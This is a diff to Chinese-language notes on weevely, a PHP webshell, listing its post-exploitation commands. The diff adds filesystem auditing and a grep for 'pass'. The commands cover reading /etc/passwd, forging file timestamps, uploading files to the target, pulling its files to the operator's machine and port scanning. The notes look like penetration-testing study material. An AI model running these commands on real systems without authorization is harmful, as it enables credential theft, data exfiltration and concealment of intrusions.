@@ -40,13 +40,15 @@ weevely的后渗透功能：
   * 工具命令`system_procs` 列出进程
   * 工具命令`:system_extensions` 查看php和web中间件信息 能看到apache_modules等信息
   * 工具命令`:audit_phpconf`
+  * 工具命令`:audit_filesystem`  查看linux下关键目录 寻找 可写/可读/可执行 文件
 * 文件操作
   * 读取文件命令`:audit_etcpasswd` 读取passwd文件(需要足够的权限)
   * 创建文件命令`touch -human-ts '2019-05-29 16:21:42' test.php` 创建文件 可设置创建时间
   * 下载文件命令`:file_download result.zip /Users/xxx/Downloads/result.zip` 把目标站的`result.zip` 下载到本地`Downloads/result.zip`
   * 上传文件命令`:file_upload /Users/xxx/Downloads/1.png file.png -force -vector fwrite`把本地文件/数据 上传到 远程目标站`file.png` 参数`-force`表示如果文件存在则强制覆盖
   * 上传文件命令`:file_upload -content "testdata" data.php` 把本地文件/数据 上传到 远程目标站`data.php`
-  * 压缩文件命令`file_zip site.zip ./` 把当前目录下所有文件压缩成site.zip
+  * 压缩文件命令`:file_zip site.zip ./` 把当前目录下所有文件压缩成site.zip
+  * 搜索内容命令`:file_grep ./ "pass"` 不建议搜索大目录
 * net网络请求
   * 端口扫描
     * 工具命令`nmap 127.0.0.1 21,22,80,443,1433,3306,3389,7001` 功能使用PHP函数fsockopen](https://www.php.net/manual/en/function.fsockopen.php)实现
